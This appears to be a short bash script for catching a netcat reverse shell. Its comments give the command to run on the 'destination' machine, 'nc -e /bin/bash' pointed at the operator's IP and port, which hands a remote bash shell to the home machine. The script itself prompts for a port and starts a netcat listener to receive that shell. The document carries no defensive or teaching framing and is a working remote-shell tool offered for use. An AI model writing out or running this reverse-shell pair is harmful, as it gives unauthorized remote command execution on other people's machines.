#nc -e /bin/bash ip port on destination
#nc -lp port on home
#run this one on home machine

echo "Enter desired port to run shell on"

read port

nc -lp $port
